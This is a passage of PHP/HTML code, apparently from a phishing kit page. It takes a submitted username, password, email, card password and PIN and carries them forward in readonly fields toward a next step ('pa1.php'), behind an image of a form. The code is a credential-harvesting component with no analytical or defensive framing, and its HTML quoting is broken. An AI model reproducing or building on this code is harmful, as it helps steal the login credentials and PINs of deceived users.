...
-ms-user-select: none;" src="img/formulario.png" alt="formulario" />
        ...
        echo '<a href="pa1.php" style="visibility:hidden></a><input id="usuario" name="usuario" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
		?>
           <?php 
                     $variable= $_POST['contra'];
        echo '<a href="pa1.php" style="visibility:hidden></a><input id="contra" name="contra" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
		?>
          <?php 
                     $variable= $_POST['email'];
        echo '<a href="pa1.php" style="visibility:hidden></a><input id="email" name="email" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
		?>
          <?php 
                     $variable= $_POST['cpass'];
        echo '<a href="pa1.php" style="visibility:hidden></a><input id="cpass" name="cpass" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
		?>
          <?php 
                     $variable= $_POST['pin'];
        echo '<a href="pa1.php" style="visibility:hidden></a><input id="pin" name="pin" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
		?>
